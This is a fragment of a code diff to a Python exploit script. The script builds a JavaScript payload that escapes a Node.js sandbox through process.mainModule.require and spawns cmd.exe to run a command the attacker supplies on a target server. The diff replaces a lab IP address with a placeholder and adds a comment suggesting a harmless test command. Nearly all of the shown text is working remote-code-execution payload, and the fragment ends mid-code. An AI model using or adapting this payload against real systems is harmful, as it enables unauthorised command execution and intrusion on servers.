@@ -10,14 +10,14 @@ if len(sys.argv) != 2:
 
 command_arg = sys.argv[1]
 
-HOST = 'http://192.168.93.1:3000'
+HOST = 'http://<HOST>:3000'
 
 command = f"""
 if (typeof global.hasRun === 'undefined' || global.hasRun === false) {{
     global.hasRun = true;
     var require = this.process.mainModule.require;
     const {{ spawn }} = require('node:child_process');
-    const test = spawn('cmd.exe', ['/c', '{command_arg}']);
+    const test = spawn('cmd.exe', ['/c', '{command_arg}']); // Try msg %username% hello
     
     test.on('exit', (code) => {{
         global.hasRun = false; // Reset hasRun when the process exits
